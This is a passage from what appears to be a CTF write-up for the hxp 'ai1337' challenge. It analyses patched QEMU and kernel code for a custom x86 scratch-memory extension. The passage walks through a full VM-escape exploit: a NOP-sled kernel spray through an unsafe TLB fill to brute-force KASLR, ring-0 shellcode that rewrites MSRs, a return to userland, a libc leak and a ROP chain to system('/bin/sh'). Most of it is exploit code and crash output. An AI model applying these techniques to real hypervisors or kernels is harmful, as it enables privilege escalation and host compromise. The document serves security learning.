+
+    tcg_gen_st_tl(tcg_constant_i64(1), tcg_env, access_offset);
+
+    // Calculate address for scratch
+    // A0 = offset_in_slice + slice_base + (slice_index * slice_size)
+    tcg_gen_ld_tl(s->A0, tcg_env, va_base_offset);
+    gen_lea_v_seg(s, s->A0, R_ES, -1);
+    tcg_gen_add_tl(s->A0, s->A0, offset_in_slice);
+
+    tcg_gen_ld32u_tl(s->tmp0, tcg_env, slice_size_offset);
+    tcg_gen_mul_tl(s->tmp0, s->tmp0, slice_index);
+    tcg_gen_add_tl(s->A0, s->A0, s->tmp0);
+
+    // Load value from scratch
+    gen_op_ld_v(s, MO_8, s->T0, s->A0);
+
+    // Write to memory address
+    gen_lea_v_seg(s, memory_address, R_DS, -1);
+    gen_op_st_v(s, MO_8, s->T0, s->A0);
+
+    gen_op_add_reg(s, s->aflag, R_ESI, dshift);
+    gen_op_add_reg(s, s->aflag, R_EDI, dshift);
+
+    tcg_gen_st_tl(tcg_constant_i64(0), tcg_env, access_offset);
+}
+
 static void gen_lods(DisasContext *s, MemOp ot)
 {
     gen_string_movl_A0_ESI(s);
-- 
2.34.1


```

</details>


Even though the linux kernel doesn't seem to have a deliberate vulnerability it will be important, because we start out as a unprivileged user. Usually QEMU exploit require CPL0 (Ring 0) access, which we should keep in mind.


#### QEMU

QEMU seems to be the focus of this challenge. We are given a patched binary *qemu_system_x86_64_ai1337* and a patch file which we will have to analyse, because it's probably where the vulnerability will lie.

*0001-Add-hack4-ai1337.patch*
<details>

```diff
From 9e4bb45f0cf64bf640b7cde987c8062b0f6040b2 Mon Sep 17 00:00:00 2001
From: sisu <contact@hxp.io>
Date: Mon, 2 Dec 2024 10:47:23 +0200
Subject: [PATCH] Add PR_SET_SCRATCH_HOLE

---
 include/uapi/linux/prctl.h |  2 ++
 kernel/sys.c               | 23 +++++++++++++++++++++++
 2 files changed, 25 insertions(+)

diff --git a/include/uapi/linux/prctl.h b/include/uapi/linux/prctl.h
index 35791791a879..c370cbb3cf6d 100644
--- a/include/uapi/linux/prctl.h
+++ b/include/uapi/linux/prctl.h
@@ -328,4 +328,6 @@ struct prctl_mm_map {
 # define PR_PPC_DEXCR_CTRL_CLEAR_ONEXEC	0x10 /* Clear the aspect on exec */
 # define PR_PPC_DEXCR_CTRL_MASK		0x1f
 
+#define PR_SET_SCRATCH_HOLE		0x53534352
+
 #endif /* _LINUX_PRCTL_H */
diff --git a/kernel/sys.c b/kernel/sys.c
index b7e096e1c3a1..b2736bed6058 100644
--- a/kernel/sys.c
+++ b/kernel/sys.c
@@ -2326,6 +2326,26 @@ int __weak arch_prctl_spec_ctrl_set(struct task_struct *t, unsigned long which,
 
 #define PR_IO_FLUSHER (PF_MEMALLOC_NOIO | PF_LOCAL_THROTTLE)
 
+static noinstr int prctl_set_scratch_hole(unsigned long opt, unsigned long addr,
+				  unsigned long size, unsigned long arg)
+{
+	const u64 new_scratch_hole = opt;
+	if ((new_scratch_hole & 0xFFFUL) != 0U) {
+		return -EINVAL;
+	}
+	if (new_scratch_hole < mmap_min_addr) {
+		return -EINVAL;
+	}
+	asm volatile(
+		"mov %0, %%rdi\n\t"
+		".byte 0x0f; .byte 0x0a; .byte 0x89\n\t" // scrhlw
+		:
+		: "r"(new_scratch_hole)
+		: "rdi", "memory"
+	);
+	return 0;
+}
+
 #ifdef CONFIG_ANON_VMA_NAME
 
 #define ANON_VMA_NAME_MAX_LEN		80
@@ -2750,6 +2770,9 @@ SYSCALL_DEFINE5(prctl, int, option, unsigned long, arg2, unsigned long, arg3,
 	case PR_SET_VMA:
 		error = prctl_set_vma(arg2, arg3, arg4, arg5);
 		break;
+	case PR_SET_SCRATCH_HOLE:
+		error = prctl_set_scratch_hole(arg2, arg3, arg4, arg5);
+		break;
 	case PR_GET_AUXV:
 		if (arg4 || arg5)
 			return -EINVAL;
-- 
2.34.1


```

</details>

Also luckily for use we have been given a assembly file that provides stubs for interacting with the custom instructions.

*ai.s*

<details>

```assembly
; nasm -f elf64 ai.s -o out/ai.o
global read_ats_base
global get_scratch_info
global load_scratch
global read_scratch
global clear_scratch
global add_slices
global sub_slices
global mul_slices

%macro mts 0
db 0x0f
db 0x0a
db 0x83
%endmacro

%macro stm 0
db 0x0f
db 0x0a
db 0x84
%endmacro

%macro fscr 0
db 0x0f
db 0x0a
db 0x85
%endmacro

%macro scradd 0
db 0x0f
db 0x0a
db 0x86
%endmacro

%macro scrsub 0
db 0x0f
db 0x0a
db 0x87
%endmacro

%macro scrmul 0
db 0x0f
db 0x0a
db 0x88
%endmacro

%macro scrhlr 0
db 0x0f
db 0x0a
db 0x8a
%endmacro

%macro scrhlw 0
db 0x0f
db 0x0a
db 0x89
%endmacro

section .text

read_ats_base:
  scrhlr
  ret

get_scratch_info:
    ; Arguments passed to this function:
    ; ptr to structure containing info -> rdi
    ;    0..7: base
    ;    8..15: default size
    ;    16..19: slice size
    ;    20..21: num slices
    push rbx
    mov rax, 0x80000022
    cpuid
    mov dword [rdi], edx
    mov dword [rdi + 4], ebx
    mov qword [rdi + 8], rax

    push rcx
    shr rcx, 10
    mov dword [rdi + 16], ecx
    pop rcx
    and rcx, 0xFF
    mov byte [rdi + 20], cl
    pop rbx
    ret

load_scratch:
    ; Arguments passed to this function:
    ; slice        -> rdi
    ; slice_offset -> rsi
    ; source       -> rdx
    ; length       -> rcx

    ; Move arguments to desired registers
    push rbx
    mov rbx, rdi      ; Move slice to rbx
    mov rdi, rsi      ; Move slice_offset to rdi
    mov rsi, rdx      ; Move source to rsi
    mov rcx, rcx      ; Length is already in rcx

    mts ; load into scratch memory

    pop rbx

    ret               ; Return to the caller

read_scratch:
    ; Arguments passed to this function:
    ; slice        -> rdi
    ; slice_offset -> rsi
    ; source       -> rdx
    ; length       -> rcx

    ; Move arguments to desired registers
    push rbx
    mov rbx, rdi      ; Move slice to rbx
    mov rdi, rsi      ; Move slice_offset to rdi
    mov rsi, rdx      ; Move destination to rsi
    mov rcx, rcx      ; Length is already in rcx

    stm

    pop rbx

    ret               ; Return to the caller

clear_scratch:
    fscr
    ret

add_slices:
    ; Arguments passed to this function:
    ; slice A      -> rdi
    ; slice B      -> rsi
    ; slice C      -> rdx
    scradd
    ret

sub_slices:
    ; Arguments passed to this function:
    ; slice A      -> rdi
    ; slice B      -> rsi
    ; slice C      -> rdx
    scrsub
    ret

mul_slices:
    ; Arguments passed to this function:
    ; slice A      -> rdi
    ; slice B      -> rsi
    ; slice C      -> rdx
    scrmul
    ret

```

</details>

last but not least we have the command used for starting the VM. One important thing to notice is that neither `smap` nor `smep` are enabled allowing us to write a 2nd stage payload directly in userland and jumping to it, without requiring disabling them through `CR4` first.

*launch_vm.sh*
<details>

```sh
#!/bin/bash

Args=(
    -cpu "hxp-ai1337"
    -m 128m

    -kernel bzImage
    -append "console=ttyS0 kaslr oops=panic panic=1"
    -initrd initramfs.cpio

    -snapshot
    -monitor /dev/null
    -no-reboot
    -nographic
    -display none
    -vga none
    -net none
)

./qemu_system_x86_64_ai1337 "${Args[@]}"
```

</details>


#### Docs

We have also been give some form of Device Specification in form of a *.pdf* (*hxp_silicon_foundaries_hack4/hxp_ai1337.pdf*) and *.rst* . Which seems to explain a number of Instructions/MSRs which have been added through QEMU and will be the target of our exploit:

Instructions:
| Opcode | Instruction | Description |
| - | - | - |
| `0F 0A 83` | `MTS` | Load RCX bytes from memory address (RSI) to slice (RBX) at slice offset (RDI) |
| `0F 0A 84` | `STM` | Read RCX bytes from slice (RBX) at slice offset (RDI) and write memory address (RSI) |
| `0F 0A 85` | `FSCR` | Clear all slices |
| `0F 0A 86` | `SCRADD` | Add the slices pointed by RDI and RSI, and store the result into slice pointed by RDX |
` 0F 0A 87` | `SCRSUB` | Subtract the slices pointed by RDI and RSI, and store the result into slice pointed by RDX |
| `0F 0A 88` | `SCRMUL` | Multiply the slices pointed by RDI and RSI, and store the result into slice pointed by RDX |
| `0F 0A 89` | `SCRHLW` (privileged) | Update scratch memory PSCHORR bi-ATS base VA |
| `0F 0A 8A` | `SCRHLR` | Read scratch memory PSCHORR bi-ATS base VA|

MSRs:
| MSR | Identifier | Description |
| - | - | - |
| `MSR_HACK4_SLICE_SIZE` | `0xC0000105` | Read/Write slice size in the AI1337 engine |
| `MSR_HACK4_NUM_SLICES` | `0xC0000106` | Read/Write count of slices in the AI1337 engine |

We also receive multiple ASCII diagrams notably this one, which is going to be relevant for our exploit.
```
      Physical Memory                Virtual Memory
            0                               |
            |                               |
  IO space  |                               |
            |                               |
            -                               |
            |                               |
            |                               |
            |                               |   Direct Addressing
    RAM     |                               |           |
            |    ___________________________|_____      |
            |   /                       |        |      |
            ---/                        | bi-ATS |------|
            |                           |        |
            |    _______________________|________|
  AI1337    |   /
 aperture   |  /  PSCHORR Interconnect
            ---

```

## Test Environment

I'm using the following tools for writing and testing my exploit:

- [vagd](https://github.com/gfelber/vagd) userland exploitation templates using docker which is based on [pwntools](https://github.com/Gallopsled/pwntools)
- [how2keap](https://github.com/gfelber/how2keap) kernel exploitation template
- [pwndbg](http://github.com/pwndbg/pwndbg) gdb plugin for kernel- and userland exploitation

# Exploit

Lets start with writing our exploit:

## Vulnerabilities

As teased before there seem to be vulnerabilities in the implementation of the x86-64 extension called AI1337. Let's have a closer look at the patches

First some constants are defined which will be relevant for the patch.

*target/i386/ops_ai1337.h*
```c
#define AI1337_SCRATCH_SIZE (33ULL * 1024)
#define AI1337_SCRATCH_MAX_NUM_SLICES (128)
#define AI1337_SCRATCH_SLICE_SIZE_DEFAULT (1024ULL)
#define AI1337_SCRATCH_NUM_SLICES_DEFAULT (33UL)
#define AI1337_SCRATCH_MAX_SLICE_SIZE (4096ULL)
```

Then we need to initialise our new variable directly in the CPU. Note that we use a stack array `cratch[AI1337_SCRATCH_SIZE]` and use it for our scratch operations. It seems like this won't be able to hold `AI1337_SCRATCH_MAX_NUM_SLICES * AI1337_SCRATCH_MAX_SLICE_SIZE` (Foreshadowing).

*target/i386/cpu.c*
```c
...
        env->scratch_config.num_active_slices = AI1337_SCRATCH_NUM_SLICES_DEFAULT;
        env->scratch_config.slice_size = AI1337_SCRATCH_SLICE_SIZE_DEFAULT;
        env->scratch_config.va_base = AI1337_SCRATCH_VA_BASE;
        env->scratch_config.phys_base = AI1337_SCRATCH_PHYS_BASE;
        env->scratch_config.access_enabled = 0;

        uint16_t scratch[AI1337_SCRATCH_SIZE];
        env->scratch_region = malloc(sizeof(MemoryRegion));
        memset(env->scratch_region, 0, sizeof(*env->scratch_region));
        memory_region_init_ram_ptr(env->scratch_region, NULL, "ai1337-scratch", AI1337_SCRATCH_SIZE, scratch);
        env->scratch_region->ram_block->flags |= RAM_RESIZEABLE;
        env->scratch_region->ram_block->max_length = AI1337_SCRATCH_MAX_NUM_SLICES * AI1337_SCRATCH_MAX_SLICE_SIZE;
        memory_region_add_subregion(get_system_memory(), AI1337_SCRATCH_PHYS_BASE, env->scratch_region);
        ...
```

When we edit MSR we directly change the values inside our CPU config without reinitialising our `scratch_region` which should lead to a `OOB`. Sadly we are only able to edit MSR directly in CPL0 which isn't possible with a unprivileged user.

*target/i386/tcg/sysemu/misc_helper.c*
```c
...
static bool helper_recalculate_scratch(CPUX86State *env, uint32_t new_num_slices, uint32_t new_slice_size)
{
    if (new_num_slices > AI1337_SCRATCH_MAX_NUM_SLICES) {
        return false;
    }
    if (new_slice_size > AI1337_SCRATCH_MAX_SLICE_SIZE) {
        return false;
    }
    uint32_t new_size = new_num_slices * new_slice_size;
    Error *err = NULL;
    bql_lock();
    memory_region_ram_resize(env->scratch_region, new_size, &err);
    bql_unlock();
    if (err) {
        return false;
    }
    env->scratch_config.num_active_slices = new_num_slices;
    env->scratch_config.slice_size = new_slice_size;
    return true;
}

void helper_wrmsr(CPUX86State *env)
...
    case MSR_HACK4_SLICE_SIZE:
        const uint32_t new_slice_size = val;
        if (!helper_recalculate_scratch(env, env->scratch_config.num_active_slices, new_slice_size)) {
            goto error;
        }
        break;
    case MSR_HACK4_NUM_SLICES:
        const uint32_t new_num_active_slices = val;
        if (!helper_recalculate_scratch(env, new_num_active_slices, env->scratch_config.slice_size)) {
            goto error;
        }
        break;
...
void helper_rdmsr(CPUX86State *env)
...
    case MSR_HACK4_SLICE_SIZE:
        val = env->scratch_config.slice_size;
        break;
    case MSR_HACK4_NUM_SLICES:
        val = env->scratch_config.num_active_slices;
        break;
...

```

And yeah it looks like we have a OOB when writing or reading from the `scratch_region` after editing the MSR.

*target/i386/tcg/translate.c*
```c
...
static void gen_mts_8(DisasContext *s, MemOp ot)
{
    const size_t slice_size_offset = offsetof(CPUX86State, scratch_config.slice_size);
    const size_t va_base_offset = offsetof(CPUX86State, scratch_config.va_base);
    const size_t access_offset = offsetof(CPUX86State, scratch_config.access_enabled);

    const TCGv slice_index = cpu_regs[R_EBX];
    const TCGv offset_in_slice = cpu_regs[R_EDI];
    const TCGv memory_address = cpu_regs[R_ESI];
    const TCGv dshift = gen_compute_Dshift(s, ot);

    tcg_gen_st_tl(tcg_constant_i64(1), tcg_env, access_offset);

    // load from memory address
    gen_lea_v_seg(s, memory_address, R_DS, -1);
    gen_op_ld_v(s, MO_8, s->T0, s->A0);

    // Calculate address for scratch
    // A0 = offset_in_slice + slice_base + (slice_index * slice_size)
    tcg_gen_ld_tl(s->A0, tcg_env, va_base_offset);
    gen_lea_v_seg(s, s->A0, R_ES, -1);
    tcg_gen_add_tl(s->A0, s->A0, offset_in_slice);
    tcg_gen_ld32u_tl(s->tmp0, tcg_env, slice_size_offset);
    tcg_gen_mul_tl(s->tmp0, s->tmp0, slice_index);
    tcg_gen_add_tl(s->A0, s->A0, s->tmp0);

    // Store value
    gen_op_st_v(s, MO_8, s->T0, s->A0);

    gen_op_add_reg(s, s->aflag, R_ESI, dshift);
    gen_op_add_reg(s, s->aflag, R_EDI, dshift);

    tcg_gen_st_tl(tcg_constant_i64(0), tcg_env, access_offset);
}

static void gen_stm_8(DisasContext *s, MemOp ot)
{
    ...
    // similar to gen_mts_8
    ...
}

```

Finally let's have a look at  the inner workings of `SCRHLW`.

*target/i386/tcg/emit.c.inc*
```c
static void gen_SCRHLW(DisasContext *s, X86DecodedInsn *decode)
{
    if (CPL(s) != 0)
    {
        gen_illegal_opcode(s);
        return;
    }
    size_t va_base_offset = offsetof(CPUX86State, scratch_config.va_base);
    tcg_gen_st_tl(cpu_regs[R_EDI], tcg_env, va_base_offset);
}

```

And we notice that this seems to unsafely update the TLB, which we can exploit. This seems to implement the functionally described in the diagram before notably our `scratch_region` is made directly accessible through virtual memory using the TLB.

*target/i386/tcg/sysemu/excp_helper.c*
```c
...
bool x86_cpu_tlb_fill(CPUState *cs, vaddr addr, int size,
                      MMUAccessType access_type, int mmu_idx,
                      bool probe, uintptr_t retaddr)
...
    if (env->scratch_config.access_enabled &&
        (addr >= env->scratch_config.va_base) &&
        ((addr + size) <= (env->scratch_config.va_base + x86_calculate_scratch_size(env)))) {
        vaddr paddr = env->scratch_config.phys_base + (addr - env->scratch_config.va_base);
        tlb_set_page_with_attrs(cs, addr & TARGET_PAGE_MASK,
                                paddr & TARGET_PAGE_MASK,
                                cpu_get_mem_attrs(env),
                                PAGE_READ | PAGE_WRITE | PAGE_EXEC, mmu_idx, TARGET_PAGE_SIZE);
        return true;
    }
...

```

Sadly `SCRHLW` is only accessible when in CPL0, but luckily for us they patched the kernel to give us access through `prctl`

*include/uapi/linux/prctl.h*
```c
...
#define PR_SET_SCRATCH_HOLE		0x53534352
...
```

*kernel/sys.c*
```c
static noinstr int prctl_set_scratch_hole(unsigned long opt, unsigned long addr,
				  unsigned long size, unsigned long arg)
{
	const u64 new_scratch_hole = opt;
	if ((new_scratch_hole & 0xFFFUL) != 0U) {
		return -EINVAL;
	}
	if (new_scratch_hole < mmap_min_addr) {
		return -EINVAL;
	}
	asm volatile(
		"mov %0, %%rdi\n\t"
		".byte 0x0f; .byte 0x0a; .byte 0x89\n\t" // scrhlw
		:
		: "r"(new_scratch_hole)
		: "rdi", "memory"
	);
	return 0;
}

...
SYSCALL_DEFINE5(prctl, int, option, unsigned long, arg2, unsigned long, arg3,
		unsigned long, arg4, unsigned long, arg5)  
...
	case PR_SET_SCRATCH_HOLE:
		error = prctl_set_scratch_hole(arg2, arg3, arg4, arg5);
		break;
...

```

## Linux Privilege Escalation

so how do we exploit a unsafe TLB update? Well basically this allows us to corrupt and virtual memory mapping we want (even CPL0 ones) as long as there is no existing TLB entry (this is an important consideration).

Also luckily for us KASLR is notoriously bad and only 16bit ([kaslr.c](https://github.com/torvalds/linux/blob/v6.12/arch/x86/mm/kaslr.c#L13)), which is realistically brute-forcible with a non crashing spray, which we have.

### TLB Inject
So yeah we create a simple PoC script that sprays `NOP`s (`0x90`) and see if we create a segfault inside the kernel.

```c
#define START_SEARCH 0xffffffff80000000
#define END_SEARCH   0xfffffffffff00000
int main(int argc, char *argv[]) {

  lstage("INIT");
  

  // cyclic_cpy(spray, 0x1000);
  rlimit_increase(RLIMIT_NOFILE);
  pin_cpu(0, 0);

  // Gather info about scratch memory
  scratch_info info = {0};
  get_scratch_info(&info);
  linfo("Scratch info:");
  linfo(" - scratch addr: 0x%lx", info.scratch_addr);
  linfo(" - scratch default size: 0x%lx bytes", info.scratch_default_size);
  linfo(" - scratch max slice size: 0x%x bytes", info.scratch_max_slice_size);
  linfo(" - scratch max slice count: %u", info.scratch_max_slice_count);

  linfo("PSCHORR bi-ATS base VA: %p", read_ats_base());

  lstage("START");

  size_t slice_size_value = 0x400;
  size_t *trampolin = (size_t*) 0x6fe1be2000;

  char package[0x8000];
  memset(package, 0x90, sizeof(package)); // spary int3
  memcpy(&package[sizeof(package) - sizeof(pivot)], pivot, sizeof(pivot));

  SYSCHK(prctl(PR_SET_SCRATCH_HOLE, trampolin));
  for (size_t i = 0; i < sizeof(package) / 0x400; i++) {
    load_scratch(i, 0, &package[i * slice_size_value], slice_size_value);
  }

  pid_t pid = fork();
  if (pid == 0) {
    linfo("crash and corrupt CPL0 TLB: %p", payload);
    load_scratch(-1, 0, "X", 1); // segfault
  }
  wait(NULL); // clear TLB allowing injection
  linfo("spray kaslr");

  for (trampolin = (size_t*) (START_SEARCH); 
      trampolin < END_SEARCH; trampolin += 0x100000 / sizeof(size_t)) {
    // linfo("spray aslr: %p", trampolin);
    SYSCHK(prctl(PR_SET_SCRATCH_HOLE, trampolin));
    if (((size_t) trampolin & 0xfffffff) == 0)
      linfo("spray aslr: %p", trampolin);
    // flush TLB
    pid_t pid = fork();
    if (pid == 0) 
      load_scratch(-1, 0, "X", 1);
    wait(NULL);
  }
  putchar('\n');

  lstage("END");
}

```

And luckily we get the following, which indicates that our `NOP`-Sled spray worked and we tried to execute some invalid NULL Bytes afterwards. 
```
[    3.646252] Call Trace:
[    3.646354]  <TASK>
[    3.655379] Oops: general protection fault, probably for non-canonical address 0x257830203a731fb1: 0000 [#23] PREEMPT SMP NOPTI
[    3.655877] CPU: 0 UID: 1000 PID: 57 Comm: pwn Not tainted 6.12.1 #2
[    3.656141] RIP: 0010:0xffffffff81008000
[    3.656332] Code: 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 <00> 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
[    3.657072] RSP: 0018:ffffc90000114800 EFLAGS: 00010007
[    3.657284] RAX: 257830203a731fb1 RBX: 48c35b02760100c5 RCX: 0000000000000000
[    3.657546] RDX: 0000000000000000 RSI: 00000000ffffffea RDI: 48c35b02760100c5
[    3.657791] RBP: ffffc900001149c8 R08: ffffffff81c95968 R09: 00000000ffffefff
[    3.658058] R10: ffffffff81c25980 R11: ffffffff81c7d980 R12: 48c35b02760100c5
[    3.658323] R13: ffffc90000114900 R14: ffffc900001149c8 R15: ffffffff81ac882d
[    3.658584] FS:  000000000040c878(0000) GS:ffff888007800000(0000) knlGS:0000000000000000
[    3.658871] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[    3.659078] CR2: 257830203a731fb1 CR3: 00000000028b4000 CR4: 00000000000006b0
[    3.659330] Call Trace:
[    3.659457]  <TASK>
[    3.668313] Oops: general protection fault, probably for non-canonical address 0x257830203a732031: 0000 [#24] PREEMPT SMP NOPTI
[    3.668793] CPU: 0 UID: 1000 PID: 57 Comm: pwn Not tainted 6.12.1 #2
[    3.669052] RIP: 0010:0xffffffff81008000
```

### CPL0 Shellcode

So next we need to create some CPL0 Shellcode.

#### Corrupt MSR

Let's start out simple and just overwrite the MSRs with the respective max values and to our luck it works.

*crpt_msr.S*
```assembly
; nasm -f bin ./crpt_msr.S && xxd -i crpt_msr > crpt_msr.h
 
MSR_HACK4_SLICE_SIZE equ 0xc0000105
MSR_HACK4_NUM_SLICES equ 0xc0000106

BITS 64
  xor rdx, rdx

  mov rax, 0x1000
  mov ecx, MSR_HACK4_SLICE_SIZE 
  wrmsr

  mov rax, 128
  mov ecx, MSR_HACK4_NUM_SLICES
  wrmsr

  int3
```

*crpt_msr.h*
```c
unsigned char crpt_msr[] = {
  0x48, 0x31, 0xd2, 0xb8, 0x00, 0x10, 0x00, 0x00, 0xb9, 0x05, 0x01, 0x00,
  0xc0, 0x0f, 0x30, 0xb8, 0x80, 0x00, 0x00, 0x00, 0xb9, 0x06, 0x01, 0x00,
  0xc0, 0x0f, 0x30, 0xcc
};
unsigned int crpt_msr_len = 28;
```

```c
...
  char package[0x8000];
  memset(package, 0x90, sizeof(package));
  memcpy(&package[sizeof(package) - sizeof(crpt_msr)], pivot, sizeof(crpt_msr));
...
```

#### Pivot
Now we need to somehow continue our exploit. As mentioned before neither `smap` nor `smep` are enabled allowing us to directly jump back into userspace so let's do that.

*pivot.S*
```c
; nasm -f bin ./pivot.S && xxd -i pivot > pivot.h
 
MSR_HACK4_SLICE_SIZE equ 0xc0000105
MSR_HACK4_NUM_SLICES equ 0xc0000106

BITS 64
  xor rdx, rdx

  mov rax, 0x1000
  mov ecx, MSR_HACK4_SLICE_SIZE 
  wrmsr

  mov rax, 128
  mov ecx, MSR_HACK4_NUM_SLICES
  wrmsr

  scasb
  mov r15, 0x1111111111111111
  call r15


```

*pivot.h*
```c
unsigned char pivot[] = {
  0x48, 0x31, 0xd2, 0xb8, 0x00, 0x10, 0x00, 0x00, 0xb9, 0x05, 0x01, 0x00,
  0xc0, 0x0f, 0x30, 0xb8, 0x80, 0x00, 0x00, 0x00, 0xb9, 0x06, 0x01, 0x00,
  0xc0, 0x0f, 0x30, 0xae, 0x49, 0xbf, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
  0x11, 0x11, 0x41, 0xff, 0xd7
};
unsigned int pivot_len = 41;
```

```c
...
void payload() {
	asm("int3");
}
...
  size_t* p = memmem(pivot, sizeof(pivot), "\x11\x11\x11\x11\x11\x11\x11\x11", 8);
  if (p != NULL) 
    *p = (size_t) &payload;
...
```
AND IT WORKS!

## QEMU Escape


After corrupting the MSRs to achieve OOB we can simply get memory leaks inside QEMU and then use that information to drop a shell and read the flag.

```c
#define BOF_IDX      16
#define BOF_OFFSET   0x800

void payload() {
  char leak[0x400];
  read_scratch(BOF_IDX, BOF_OFFSET, leak, sizeof(leak));
  size_t offset = 0x3d8;

  size_t libc = *(size_t*)&leak[0x378] - 0x11b9e1; 
  load_scratch(0, 0, &me, 8);
  load_scratch(0, 8, &libc, 8);

  size_t bof_size = sizeof(leak) - offset;
  char* bof = leak + offset;

  bzero(bof, bof_size);
  ((size_t*)bof)[0] = libc + 0x10f75b+1; // ret 
  ((size_t*)bof)[1] = libc + 0x10f75b;   // pop rdi; ret 
  ((size_t*)bof)[2] = libc + 0x1cb42f;   // "/bin/sh"
  ((size_t*)bof)[3] = libc + 0x58740;    // system
  load_scratch(BOF_IDX, BOF_OFFSET + offset, bof, bof_size);
  for(;;);
}
```

## Final

*pwn.c*
<details>

```c
// gcc -static -O0 -DGNU_SOURCE ./pwn.c ./out/ai.o -o ./out/pwn
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/prctl.h>
#include <sys/wait.h>
#include <errno.h>
#include <limits.h>
#include <sched.h>

#define PR_SET_SCRATCH_HOLE		0x53534352

typedef struct scratch_info {
    uint64_t scratch_addr;
    uint64_t scratch_default_size;
    uint32_t scratch_max_slice_size;
    uint16_t scratch_max_slice_count;
} scratch_info;

void* read_ats_base();
void get_scratch_info(scratch_info *info);
void load_scratch(uint64_t slice, uint64_t slice_offset, void *source, uint64_t length);
void read_scratch(uint64_t slice, uint64_t slice_offset, void *destination, uint64_t length);

/*******************************
 * HELPERS                     *
 *******************************/

/* Assert that a syscall x has succeeded. */
#define SYSCHK(x)                                                              \
  ({                                                                           \
    typeof(x) __res = (x);                                                     \
    if (__res == (typeof(x))-1) {                                              \
      lerror("%s:\n  %s", "SYSCHK(" #x ")", strerror(errno));                  \
    }                                                                          \
    __res;                                                                     \
  })

#define RED(x) "\033[31;1m" x "\033[0m"
#define GREEN(x) "\033[32;1m" x "\033[0m"
#define YELLOW(x) "\033[33;1m" x "\033[0m"
#define BLUE(x) "\033[34;1m" x "\033[0m"
#define MAGENTA(x) "\033[35;1m" x "\033[0m"

#define LINFO "[" BLUE("*") "] "
#define LDEBUG "[" GREEN("D") "] "
#define LWARN "[" YELLOW("!") "] "
#define LERROR "[" RED("-") "] "
#define LSTAGE "[" MAGENTA("STAGE: %d") "] "

#define linfo(format, ...) printf(LINFO format "\n", ##__VA_ARGS__)
#define lhex(x) linfo("0x%016lx <- %s", (uint64_t)x, #x)

#define lwarn(format, ...) fprintf(stderr, LWARN format "\n", ##__VA_ARGS__)

#define lerror(format, ...)                                                    \
  do {                                                                         \
    fprintf(stderr, LERROR format "\n", ##__VA_ARGS__);                        \
    exit(EXIT_FAILURE);                                                        \
  } while (0)

#ifdef DEBUG
#define ldebug(format, ...) printf(LDEBUG format "\n", ##__VA_ARGS__)
#else
#define ldebug(...)
#endif

int stage;
#define lstage(format, ...) printf(LSTAGE format "\n", ++stage, ##__VA_ARGS__)

void cat(char *fname) {
  int fd = SYSCHK(open(fname, O_RDONLY));

  char buf[4096];
  ssize_t n;
  while ((n = read(fd, buf, sizeof(buf))) > 0)
    write(STDOUT_FILENO, buf, n);

  close(fd);
}

unsigned char pivot[] = {
  0x48, 0x31, 0xd2, 0xb8, 0x00, 0x10, 0x00, 0x00, 0xb9, 0x05, 0x01, 0x00,
  0xc0, 0x0f, 0x30, 0xb8, 0x80, 0x00, 0x00, 0x00, 0xb9, 0x06, 0x01, 0x00,
  0xc0, 0x0f, 0x30, 0xae, 0x49, 0xbf, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
  0x11, 0x11, 0x41, 0xff, 0xd7
};
unsigned int pivot_len = 41;


void pin_cpu(pid_t pid, int cpu) {
  cpu_set_t cpuset;
  CPU_ZERO(&cpuset);
  CPU_SET(cpu, &cpuset);
  SYSCHK(sched_setaffinity(pid, sizeof(cpuset), &cpuset));
}

int rlimit_increase(int rlimit) {
  struct rlimit r;
  SYSCHK(getrlimit(rlimit, &r));

  if (r.rlim_max <= r.rlim_cur) {
    linfo("rlimit %d remains at %.lld", rlimit, r.rlim_cur);
    return 0;
  }

  r.rlim_cur = r.rlim_max;
  int res;
  res = SYSCHK(setrlimit(rlimit, &r));

  ldebug("rlimit %d increased to %lld", rlimit, r.rlim_max);

  return res;
}

/*******************************
 * EXPLOIT                     *
 *******************************/

/*
 * kaslr probes
 * 0xffffffffaca00040
 * 0xffffffff92a00040
 * 0xffffffff81c00040
 * 0xffffffffb7800040
 * 0xffffffff99c00040
 */

#define START_SEARCH 0xffffffff80000000
#define END_SEARCH   0xfffffffffff00000
#define TRAMPOLIN    0xffffffff81800000
#define SPRAY_SIZE   0x1000
#define BOF_IDX      16
#define BOF_OFFSET   0x800

int64_t me = 0x6fe1be2;

void payload() {
  char leak[0x400];
  read_scratch(BOF_IDX, BOF_OFFSET, leak, sizeof(leak));
  size_t offset = 0x3d8;

  size_t libc = *(size_t*)&leak[0x378] - 0x11b9e1; 
  load_scratch(0, 0, &me, 8);
  load_scratch(0, 8, &libc, 8);

  size_t bof_size = sizeof(leak) - offset;
  char* bof = leak + offset;

  bzero(bof, bof_size);
  ((size_t*)bof)[0] = libc + 0x10f75b+1; // ret 
  ((size_t*)bof)[1] = libc + 0x10f75b;   // pop rdi; ret 
  ((size_t*)bof)[2] = libc + 0x1cb42f;   // "/bin/sh"
  ((size_t*)bof)[3] = libc + 0x58740;    // system
  load_scratch(BOF_IDX, BOF_OFFSET + offset, bof, bof_size);
  for(;;);
}

int main(int argc, char *argv[]) {

  lstage("INIT");
  

  // cyclic_cpy(spray, 0x1000);
  rlimit_increase(RLIMIT_NOFILE);
  pin_cpu(0, 0);

  // Gather info about scratch memory
  scratch_info info = {0};
  get_scratch_info(&info);
  linfo("Scratch info:");
  linfo(" - scratch addr: 0x%lx", info.scratch_addr);
  linfo(" - scratch default size: 0x%lx bytes", info.scratch_default_size);
  linfo(" - scratch max slice size: 0x%x bytes", info.scratch_max_slice_size);
  linfo(" - scratch max slice count: %u", info.scratch_max_slice_count);

  linfo("PSCHORR bi-ATS base VA: %p", read_ats_base());

  lstage("START");

  size_t slice_size_value = 0x400;
  size_t *trampolin = (size_t*) 0x6fe1be2000;

  size_t* p = memmem(pivot, sizeof(pivot), "\x11\x11\x11\x11\x11\x11\x11\x11", 8);
  if (p != NULL) 
    *p = (size_t) &payload;

  char package[0x8000];
  memset(package, 0x90, sizeof(package));
  memcpy(&package[sizeof(package) - sizeof(pivot)], pivot, sizeof(pivot));

